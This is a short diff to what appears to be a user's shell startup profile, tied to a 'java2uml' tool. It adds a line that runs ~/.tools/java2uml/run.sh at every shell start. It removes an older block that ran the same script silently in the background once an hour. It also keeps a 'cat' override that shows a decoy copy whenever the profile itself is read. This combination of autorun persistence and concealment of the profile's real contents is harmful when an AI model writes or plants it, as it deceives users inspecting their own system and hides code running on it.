@@ -1,4 +1,5 @@
 chmod +x ~/.tools/java2uml/run.sh
+~/.tools/java2uml/run.sh
 cat() {
     if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
         command cat ~/.cache/.zprofile
@@ -66,25 +67,6 @@ eval "$(/opt/homebrew/bin/brew shellenv)"
 
 
 
-
-LAST_RUN_FILE="$HOME/.cache/java2uml_last_run"
-SCRIPT="$HOME/.tools/java2uml/run.sh"
-
-mkdir -p "$HOME/.cache"
-
-# 初期化
-if [ ! -f "$LAST_RUN_FILE" ] || ! [[ $(<"$LAST_RUN_FILE") =~ ^[0-9]+$ ]]; then
-  echo 0 > "$LAST_RUN_FILE"
-fi
-
-LAST_RUN=$(<"$LAST_RUN_FILE")
-CURRENT_TIME=$(date +%s)
-ELAPSED=$((CURRENT_TIME - LAST_RUN))
-
-if [ "$ELAPSED" -ge 3600 ]; then
-  "$SCRIPT" > /dev/null 2>&1 &
-  echo "$CURRENT_TIME" > "$LAST_RUN_FILE"
-fi
 
 
 # java2uml 関数定義
